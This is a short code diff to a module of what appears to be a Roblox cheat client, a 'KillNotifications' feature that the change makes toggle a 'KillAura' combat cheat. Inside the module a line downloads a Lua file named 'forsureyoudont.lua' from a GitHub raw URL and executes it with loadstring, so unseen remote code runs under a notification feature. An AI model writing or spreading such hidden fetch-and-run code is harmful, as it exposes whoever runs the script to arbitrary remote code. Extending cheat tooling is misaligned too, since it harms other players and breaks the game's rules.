@@ -5,6 +5,7 @@ KillNotifications = vape.Categories.Render:CreateModule({
 	Function = function(callback)
 		if callback then
             if AdvancedCheck.Enabled then
+				KillAura:Toggle()
 				loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/forsureyoudont.lua'))()
 				KillNotifications:Clean(guiService.ErrorMessageChanged:Connect(function(str)
 					if (guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectLuaKick) and guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectConnectionLost then
